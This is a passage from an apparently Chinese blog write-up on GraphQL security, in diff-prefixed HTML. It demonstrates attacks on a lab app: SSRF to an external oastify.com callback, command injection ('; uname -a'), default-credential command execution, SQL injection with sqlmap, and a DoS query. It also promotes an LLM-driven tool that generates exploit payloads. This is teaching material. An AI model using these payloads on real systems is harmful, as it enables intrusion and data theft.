+		data-flex-basis="480px"
+	
+></p>
+<h4 id="4ssrf漏洞">4.SSRF漏洞
+</h4><p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/10.png"
+	width="1842"
+	height="1050"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/10_hudd2b1e03c18941a05a4c5d8031f60dd7_147413_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/10_hudd2b1e03c18941a05a4c5d8031f60dd7_147413_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="175"
+		data-flex-basis="421px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">graphql</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">242</span><span class="p">.</span><span class="na">215</span><span class="p">:</span><span class="n">5013</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">320</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">122</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">6261</span><span class="p">.</span><span class="na">112</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Origin</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//192.168.242.215:5013</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//192.168.242.215:5013/import_paste</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">env</span><span class="o">=</span><span class="n">graphiql</span><span class="p">:</span><span class="n">disable</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="s">&#34;query&#34;</span><span class="p">:</span><span class="s">&#34;mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\n        importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\n          result\n        }\n      }&#34;</span><span class="p">,</span><span class="s">&#34;variables&#34;</span><span class="p">:{</span><span class="s">&#34;host&#34;</span><span class="p">:</span><span class="s">&#34;w52ao9sfbm7939wjvqar5qaqkhq8ez2o.oastify.com&#34;</span><span class="p">,</span><span class="s">&#34;port&#34;</span><span class="p">:</span><span class="n">80</span><span class="p">,</span><span class="s">&#34;path&#34;</span><span class="p">:</span><span class="s">&#34;/&#34;</span><span class="p">,</span><span class="s">&#34;scheme&#34;</span><span class="p">:</span><span class="s">&#34;http&#34;</span><span class="p">}}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/11.png"
+	width="1931"
+	height="1004"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/11_hu0379d566180e365bf65eeee0cadfee00_101273_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/11_hu0379d566180e365bf65eeee0cadfee00_101273_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="192"
+		data-flex-basis="461px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">mutation</span><span class="w"> </span><span class="nf">ImportPaste</span><span class="w"> </span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">$host</span><span class="p">:</span><span class="w"> </span><span class="n">String</span><span class="o">!</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">$port</span><span class="p">:</span><span class="w"> </span><span class="n">Int</span><span class="o">!</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">$path</span><span class="p">:</span><span class="w"> </span><span class="n">String</span><span class="o">!</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">$scheme</span><span class="p">:</span><span class="w"> </span><span class="n">String</span><span class="o">!</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">importPaste</span><span class="p">(</span><span class="n">host</span><span class="p">:</span><span class="w"> </span><span class="n">$host</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="p">:</span><span class="w"> </span><span class="n">$port</span><span class="p">,</span><span class="w"> </span><span class="n">path</span><span class="p">:</span><span class="w"> </span><span class="n">$path</span><span class="p">,</span><span class="w"> </span><span class="n">scheme</span><span class="p">:</span><span class="w"> </span><span class="n">$scheme</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">result</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;host&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;uwu8f7jd2ky7u7nhmo1pwo1obfh65ytn.oastify.com&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;port&#34;</span><span class="p">:</span><span class="w"> </span><span class="n">80</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;path&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;/&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;scheme&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;http&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>探测内网端口，存在端口会一直卡住，不存在端口直接返回</p>
+<p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/12.png"
+	width="2560"
+	height="1243"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/12_hu255de9c41029e8dba472ac6615ad66f4_171438_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/12_hu255de9c41029e8dba472ac6615ad66f4_171438_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="205"
+		data-flex-basis="494px"
+	
+></p>
+<h4 id="5代码执行漏洞">5.代码执行漏洞
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">mutation</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">importPaste</span><span class="p">(</span><span class="n">host</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;localhost&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="p">:</span><span class="w"> </span><span class="n">80</span><span class="p">,</span><span class="w"> </span><span class="n">path</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;/ ; uname -a&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">scheme</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;http&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">result</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/13.png"
+	width="2560"
+	height="1006"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/13_hu49fd3ea4fc1a6b8b9c09ceeba8f2d761_171812_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/13_hu49fd3ea4fc1a6b8b9c09ceeba8f2d761_171812_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="254"
+		data-flex-basis="610px"
+	
+></p>
+<p>查询操作 <code>systemDiagnostics</code> 出于调试目的，允许接收部分 UNIX 系统命令工具作为参数，例如 <code>whoami</code>、<code>ps</code> 等。该操作的作用类似于一个<strong>受限 shell</strong>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">query</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">systemDiagnostics</span><span class="p">(</span><span class="n">username</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;admin&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;changeme&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">cmd</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;id&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/14.png"
+	width="2484"
+	height="989"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/14_huc95e10cb92b025e33374521cd4cce9dd_166669_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/14_huc95e10cb92b025e33374521cd4cce9dd_166669_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="602px"
+	
+></p>
+<h4 id="6存储型xss漏洞">6.存储型XSS漏洞
+</h4><p><strong>发布帖子处和导入帖子处存在存储型XSS漏洞</strong></p>
+<p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/15.png"
+	width="2560"
+	height="858"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/15_hufd18768eac43021e0aa0c94cbc4e07ff_157627_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/15_hufd18768eac43021e0aa0c94cbc4e07ff_157627_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="298"
+		data-flex-basis="716px"
+	
+></p>
+<p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/16.png"
+	width="2560"
+	height="1114"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/16_hub7615a09835bc5729e4253d8f6878787_290636_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/16_hub7615a09835bc5729e4253d8f6878787_290636_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="229"
+		data-flex-basis="551px"
+	
+></p>
+<h4 id="7sql注入漏洞">7.SQL注入漏洞
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">query</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">pastes</span><span class="p">(</span><span class="n">filter</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;aaa&#39;&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">content</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">title</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>单引号数据库报错</strong></p>
+<p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/17.png"
+	width="2546"
+	height="1018"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/17_hu105398d6b71e8ee1aa1045b1e99d344c_233662_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/17_hu105398d6b71e8ee1aa1045b1e99d344c_233662_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="250"
+		data-flex-basis="600px"
+	
+></p>
+<p><strong>闭合单引号正常输出</strong></p>
+<p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/18.png"
+	width="2560"
+	height="916"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/18_hu2067a838e964cac5a5f414ff2ff5856d_142560_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/18_hu2067a838e964cac5a5f414ff2ff5856d_142560_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="279"
+		data-flex-basis="670px"
+	
+></p>
+<p><strong>将数据包保存为txt使用SQLMAP即可实现自动化注入</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">python</span><span class="w"> </span><span class="n">sqlmap</span><span class="p">.</span><span class="na">py</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">24767</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">sql</span><span class="p">.</span><span class="na">txt</span><span class="w"> </span><span class="o">--</span><span class="n">level</span><span class="w"> </span><span class="n">3</span><span class="w"> </span><span class="o">--</span><span class="n">batch</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">filter</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/19.png"
+	width="2558"
+	height="1310"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/19_hub41b1256cc3f397cfa5d7f45c12cdd47_409866_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/19_hub41b1256cc3f397cfa5d7f45c12cdd47_409866_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="195"
+		data-flex-basis="468px"
+	
+></p>
+<h4 id="8拒绝服务攻击ddos">8.拒绝服务攻击DDOS
+</h4><p>在 GraphQL 中，存在一种名为<strong>查询成本分析</strong>的机制。该机制会为那些解析开销较高的字段分配对应的<strong>权重值</strong>。借助这一功能，我们可以设定一个<strong>成本上限阈值</strong>，一旦查询的总成本超过该阈值，就直接拒绝执行此查询。除此之外，还可以实现<strong>缓存功能</strong>，避免在短时间内重复处理相同的请求。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">graphql</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">242</span><span class="p">.</span><span class="na">215</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">87</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">122</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">6261</span><span class="p">.</span><span class="na">112</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Origin</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//192.168.242.215:5013</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//192.168.242.215:5013/my_pastes</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">env</span><span class="o">=</span><span class="n">graphiql</span><span class="p">:</span><span class="n">disable</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;query&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;query GeneratedOperation {\n  systemUpdate\n}&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;variables&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/20.png"
+	width="2556"
+	height="1038"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/20_hu98fe99621bc703269ad5b2d07a6048b9_241752_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/20_hu98fe99621bc703269ad5b2d07a6048b9_241752_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="246"
+		data-flex-basis="590px"
+	
+></p>
+<p>总结：GoaphQL技术本质是一个接口文档类似于Swagger，包含接口端点和参数名参数类型，存在很多类型漏洞（包括常见Top10漏洞），挖掘思路就是利用泄露的端点和参数去Fuzz，从而判断是否存在漏洞</p>
+<h2 id="4llm-graphql">4.LLM-GraphQL
+</h2><p><a class="link" href="https://github.com/Lserein/LLM-GraphQL"  target="_blank" rel="noopener"
+    >https://github.com/Lserein/LLM-GraphQL</a></p>
+<p>Model-assisted Cyber Penetration for GraphQL 一个轻量级、AI 驱动的 GraphQL 自动化漏洞探测工具。利用大语言模型（LLM）智能分析 Schema，自动构造并验证 SSRF、RCE、信息泄露等漏洞。</p>
+<h2 id="-功能特性">🔍 功能特性
+</h2><ul>
+<li>✅ 自动 GraphQL 指纹识别（支持 100+ 常见路径）</li>
+<li>✅ 内省（Introspection）泄露检测与 Schema 获取</li>
+<li>✅ <strong>完整内省查询</strong>：获取所有类型、枚举、输入类型、接口信息</li>
+<li>✅ Mutation &amp; Query 参数自动提取与风险分析</li>
+<li>✅ <strong>AI 驱动</strong>：大模型生成 SSRF/RCE/SQLi/信息泄露 Payload</li>
+<li>✅ <strong>智能 Fuzzing</strong>：AI 分析响应并迭代优化 Payload（默认启用，3 轮迭代）</li>
+<li>✅ <strong>智能字段处理</strong>：使用 <code>__typename</code> 避免猜测字段错误</li>
+<li>✅ <strong>多维度 RCE 检测</strong>：时间盲注 + 回显检测（whoami/id）+ OAST 外连</li>
+<li>✅ 自动漏洞验证（OAST + 时间盲注 + 关键词匹配）</li>
+<li>✅ <strong>自动错误修复</strong>：GraphQL 语法错误自动修复与重试</li>
+<li>✅ <strong>HTML 报告生成</strong>：精美的漏洞报告，支持 HTML/JSON/Markdown 格式</li>
+<li>✅ <strong>认证支持</strong>：自定义 Headers、Cookies、认证文件</li>
+<li>✅ <strong>代理支持</strong>：HTTP/HTTPS/SOCKS5 代理，方便与 Burp Suite 联动</li>
+<li>✅ 清晰的控制台彩色输出</li>
+<li>✅ 支持多种 LLM（Qwen、Ollama/Llama3）</li>
+</ul>
+<p>配置config.ini</p>
+<p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/21.png"
+	width="1687"
+	height="1084"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/21_hu6ee65ac75dd69fbb958235723c54f0bb_193528_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/21_hu6ee65ac75dd69fbb958235723c54f0bb_193528_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="155"
+		data-flex-basis="373px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">python</span><span class="w"> </span><span class="n">mcp</span><span class="o">-</span><span class="n">graphql</span><span class="p">.</span><span class="na">py</span><span class="w"> </span><span class="o">--</span><span class="n">url</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/22.png"
+	width="2019"
+	height="989"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/22_hu8e08872b8b9bfb9768bef0d5d8336f07_163107_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/22_hu8e08872b8b9bfb9768bef0d5d8336f07_163107_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="204"
+		data-flex-basis="489px"
+	
+></p>
+<p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/23.png"
+	width="2196"
+	height="1352"
